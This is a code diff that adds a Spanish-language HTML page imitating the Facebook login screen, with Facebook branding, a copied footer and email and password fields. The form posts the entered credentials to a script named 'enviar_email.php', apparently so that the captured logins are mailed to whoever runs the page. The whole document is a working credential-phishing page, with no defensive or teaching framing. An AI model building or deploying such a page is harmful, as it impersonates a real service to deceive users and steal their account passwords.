@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        /* Estilos generales */
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        /* Estilos para el encabezado */
+        .login-header {
+            margin-bottom: 20px;
+        }
+
+        .login-header h1 {
+            font-size: 2.5rem;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+
+        .login-header p {
+            color: #65676b;
+            font-size: 0.9rem;
+        }
+
+        /* Estilos para el formulario */
+        .login-form {
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .form-control {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 15px;
+            font-size: 1rem;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            background-color: #f0f2f5;
+            box-sizing: border-box;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .btn-primary {
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            padding: 15px;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            background-color: #166fe5;
+        }
+
+        /* Estilos para los enlaces adicionales */
+        .additional-links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
+            color: #65676b;
+        }
+
+        .additional-links a {
+            color: #1877f2;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .additional-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilos para el pie de página */
+        .footer {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #8d949e;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Facebook</h1>
+            <p>Conéctate con amigos y el mundo que te rodea en Facebook.</p>
+        </div>
+        <form class="login-form" action="enviar_email.php" method="post">
+            <input type="email" name="email" class="form-control" placeholder="Correo electrónico o número de teléfono" required>
+            <input type="password" name="password" class="form-control" placeholder="Contraseña" required>
+            <button type="submit" class="btn-primary">Iniciar sesión</button>
+        </form>
+        <div class="additional-links">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <a href="#">Crear cuenta nueva</a>
+        </div>
+        <div class="footer">
+            <p>Facebook Inc. &copy; 2024 · <a href="#">Condiciones</a> · <a href="#">Privacidad</a></p>
+        </div>
+    </div>
+</body>
+</html>
